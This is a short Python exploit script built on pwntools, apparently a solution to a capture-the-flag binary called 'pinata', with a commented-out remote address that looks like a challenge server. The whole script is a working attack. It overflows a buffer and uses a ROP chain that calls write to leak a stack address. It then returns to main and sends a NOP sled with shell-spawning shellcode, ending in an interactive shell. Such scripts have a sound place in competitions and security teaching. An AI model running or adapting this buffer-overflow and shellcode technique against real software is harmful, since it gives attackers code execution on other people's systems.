from pwn import *
context.arch = "amd64"

io = process("./pinata")
# io = remote("94.237.57.79", 41764)
elf = ELF("./pinata")
libc = ELF("./glibc/libc.so.6")
rop = ROP("./pinata")
# gdb.attach(io, """b main""")

payload = b"A" * 24
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0])
payload += p64(1)
payload += p64(rop.find_gadget(["pop rsi", "ret"])[0])
payload += p64(0x4c6fa0)
payload += p64(rop.find_gadget(["pop rdx", "pop rbx", "ret"])[0])
payload += p64(100)
payload += p64(100)

payload += p64(elf.sym["write"])
payload += p64(elf.sym["main"])
io.sendline(payload)

io.recvuntil(b">> ")
stack = unpack(io.recv(6), "all")
log.info("gets: " + hex(stack))

shellcode = asm(shellcraft.sh())
# pause()
io.sendline(p64(0)*3 + p64(stack - 0x19c6) + b"\x90"*1000 + shellcode)

io.interactive()
